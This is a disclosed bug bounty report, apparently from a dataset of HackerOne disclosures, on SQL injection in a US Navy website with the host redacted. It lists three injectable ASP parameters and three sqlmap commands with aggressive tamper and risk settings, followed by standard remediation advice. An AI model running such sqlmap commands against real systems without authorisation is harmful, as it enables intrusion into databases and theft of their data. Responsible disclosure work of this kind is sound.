---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '197755'
original_report_id: '197755'
title: SQL injection found in US Navy Website (http://███/)
weakness: SQL Injection
team_handle: deptofdefense
created_at: '2017-01-12T07:42:14.796Z'
disclosed_at: '2019-12-02T18:32:51.942Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- sql-injection
---

# SQL injection found in US Navy Website (http://███/)

## Metadata

- HackerOne Report ID: 197755
- Weakness: SQL Injection
- Program: deptofdefense
- Disclosed At: 2019-12-02T18:32:51.942Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**

SQL injection found in US Navy Website (http://█████/)

**Description:**

SQL injection found in US Navy website, parameters are:

/display.asp?story_id=98373
/listStories.asp?x=4
/viewVideo.asp?t=6

SQLmap commands:

sqlmap.py -u http://█████/submit/display.asp?story_id=98373 --random-agent --dbms=HSQLDB --level=5 --risk=3 --tamper=between,bluecoat --data="display.asp?story_id=98373" --time-sec=65 --no-cast -v 3

sqlmap.py -u http://███/listStories.asp?x=4 --random-agent --dbms=HSQLDB --level=5 --risk=3 --tamper=between,bluecoat --data="listStories.asp?x=4" --time-sec=65 --no-cast -v 3

sqlmap.py -u http://██████/viewVideo.asp?t=6 --random-agent --dbms=HSQLDB --level=5 --risk=3 --tamper=between,bluecoat --data="viewVideo.asp?t=6" --time-sec=65 --no-cast -v 3

## Impact

Critical

## Step-by-step Reproduction Instructions

1. Crawling website for vulnerabilities. 
2. Found some parameters having SQL injection.
3. Verified from SQLmap. Screenshots are also attached.

## Product, Version, and Configuration (If applicable)

## Suggested Mitigation/Remediation Actions

Primary Defenses:

Option #1: Use of Prepared Statements (Parameterized Queries)
Option #2: Use of Stored Procedures
Option #3: Escaping all User Supplied Input

Additional Defenses:

Also Enforce: Least Privilege
Also Perform: White List Input Validation

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
